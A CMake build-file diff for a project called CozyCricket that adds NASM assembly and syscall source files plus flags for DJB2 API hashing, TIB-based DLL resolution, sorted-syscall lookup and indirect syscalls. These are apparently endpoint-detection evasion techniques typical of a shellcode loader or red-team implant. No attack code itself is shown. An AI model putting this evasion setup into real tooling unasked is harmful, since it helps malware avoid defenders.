@@ -1,5 +1,5 @@
 cmake_minimum_required(VERSION 3.15)
-project(CozyCricket LANGUAGES CXX)
+project(CozyCricket LANGUAGES CXX ASM_NASM)
 
 set(CMAKE_EXE_LINKER_FLAGS "-static")
 
@@ -7,7 +7,7 @@ set(CMAKE_CXX_STANDARD 23)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 
 ### ----- START CHANGEME -----
-add_definitions(-DRETRIEVE_LOCAL -DHASH_DJB2 -DRESOLVEDLL_TIB -DRESOLVEAPI_DOS)
+add_definitions(-DRETRIEVE_LOCAL -DHASH_DJB2 -DRESOLVEDLL_TIB -DRESOLVEAPI_DOS -DGETSYSCALL_SORT_TARTARUS -DSYSCALL_INDIRECT)
 ### ----- END CHANGEME -----
 
 add_executable(cozycricket
@@ -18,6 +18,8 @@ add_executable(cozycricket
     hash/hash.cpp
     resolve/resolve_dll.cpp
     resolve/resolve_api.cpp
+    syscall/get_syscall.cpp
+    syscall/syscalls.asm
 )
 
 find_package(OpenSSL REQUIRED)
